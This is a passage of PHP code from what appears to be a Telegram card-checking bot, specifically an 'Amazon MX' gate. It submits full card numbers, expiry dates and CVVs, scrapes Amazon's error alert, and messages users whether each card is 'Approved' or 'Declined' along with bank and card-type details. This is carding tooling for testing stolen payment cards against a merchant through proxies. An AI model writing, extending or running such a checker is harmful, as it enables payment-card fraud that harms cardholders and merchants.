$message = $sky->getstr($req12, 'role="alert"><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading"><span class="a-size-small prime-mobile-error-text">', '</span>');




$tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 4);
if(strlen($mes) == 1){
    $mes = '0'.$mes;
}
bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://example.invalid/legacy'>ϟ</a>] Gate Special: >_$-Amazon MX
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Status: <code>ALMOST FINISHED 🟩</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);
antisppre($gId);

if (empty($message)) {
$status = "Approved Card!";
$response = "Approved Card! ✅";
} else {
  $status = "[ DECLINED 🔴 ]";
$response = "$message";
}
   
bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://example.invalid/legacy'>ϟ</a>] Gate Special: >_$-Amazon MX
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
[<a href='https://example.invalid/legacy'>ϟ</a>] Status: <code>$status</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Response: <code>$response</code>
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Card Check info: Proxy's: <code>Live ✅</code> 
[<a href='https://example.invalid/legacy'>ϟ</a>] Time: <code>$tiempo</code> | Gate: <code>$NameGater</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);



$free = antispFree($gId);
$premi = antisppre($gId);

}}

